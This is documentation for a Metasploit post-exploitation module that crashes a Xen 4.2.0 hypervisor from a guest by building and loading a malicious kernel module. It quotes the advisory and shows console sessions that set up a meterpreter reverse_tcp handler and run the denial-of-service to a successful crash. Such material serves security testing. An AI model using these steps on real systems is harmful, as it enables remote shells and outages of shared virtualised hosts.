This is a post exploitation module that exploits a memory corruption bug in Xen
4.2.0, causing a denial-of-service against the hypervisor from a guest VM. From
the original advisory:

> Downgrading the grant table version of a guest involves freeing its
status pages. This freeing was incomplete - the page(s) are freed back
to the allocator, but not removed from the domain's tracking
list. This would cause list corruption, eventually leading to a
hypervisor crash.

## Mechanism

This module aims to be portable by building the exploit module on the target
machine directly, building a malicious Linux Kernel Module (LKM) and inserting it
into the kernel of the paravirtualized host. It is necessary to build the
kernel module on the fly, since kernel ABIs are notoriously unstable and
unlikely to work between multiple kernel versions.

This module is tested on Debian and Ubuntu hosts running various versions of
Xen. Because the LKM is built at exploit-time, it requires that build tools and
kernel headers for the currently-running kernel to exist on the target machine.

## Example output

Failure (bad Xen version):

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.1
lhost => 192.168.1.1
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.1.1:4444
[*] Starting the payload handler...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 192.168.1.1
[*] Meterpreter session 1 opened (192.168.1.1:4444 -> 192.168.1.2:43488) at 2016-07-13 00:27:31 -0500

meterpreter >
meterpreter > background
[*] Backgrounding session 1...
msf exploit(handler) > use post/linux/dos/xen_420_dos
msf post(xen_420_dos) > set session -1
session => -1
msf post(xen_420_dos) > run

[*] Detecting requirements...
[+] Detected root privilege
[+] Detected build-essential
[+] Detected Xen
[+] Detected running Xen
[*] Xen Version: 4.6.0
[-] Sorry, wrong Xen Version
[*] Post module execution completed
```

Success:

```
msf post(xen_420_dos) > run

[*] Detecting requirements...
[+] Detected root privilege
[+] Detected build-essential
[+] Detected Xen
[+] Detected running Xen
[*] Xen Version: 4.2.0
[-] Detected correct Xen version
[*] DoS was successful!
[*] Post module execution completed
[*] 192.168.1.2 - Command shell session 1 closed.  Reason: Died from EOFError
```

## Future Work

A kernel module compilation mixin that works like the Dynamic Kernel Module
Support (DKMS) framework, would be useful in order to allow other kernel-level
exploits to be built as-needed. Supporting this using the Metasploit Post
Exploitation API and supporting more Linux distributions would make similar
exploits easier to build.
